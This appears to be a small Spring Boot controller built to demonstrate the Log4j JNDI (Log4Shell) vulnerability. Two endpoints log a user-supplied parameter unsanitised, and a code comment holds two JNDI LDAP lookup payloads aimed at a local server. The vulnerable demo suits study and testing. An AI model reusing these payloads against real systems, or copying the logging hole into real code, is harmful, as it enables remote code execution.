package com.example.demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class TestController {

    private static final Logger logger = LogManager.getLogger(DemoApplication.class);

    /**
     * ${jndi:ldap://127.0.0.1:1389/Log4jRCE}
     * ${jndi:ldap://127.0.0.1:1389/Exploit}
     * @param name
     * @return
     */
    @GetMapping("/callRemoteJNDI")
    public String testCallRemoteJNDIServer(@RequestParam("name") String name) {
        logger.info("coming");
        logger.error(name);
        return "OK";
    }


    @GetMapping("/callRemoteJNDIResult")
    public void callRemoteJNDIResult(@RequestParam("name") String name) {
        logger.info(name);
    }

}
